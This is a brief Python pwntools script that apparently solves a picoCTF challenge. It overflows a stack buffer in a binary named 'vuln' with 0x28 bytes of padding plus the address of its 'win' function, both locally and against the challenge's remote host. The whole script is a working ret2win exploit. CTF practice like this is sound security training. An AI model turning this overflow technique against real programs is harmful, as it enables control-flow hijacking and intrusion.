from pwn import *

elf = context.binary = ELF("./vuln")
p = process("./vuln")
p = remote("mysterious-sea.picoctf.net", 54669)
pay = b"a"*0x28 + p64(elf.sym.win)
p.sendline(pay)
p.interactive()
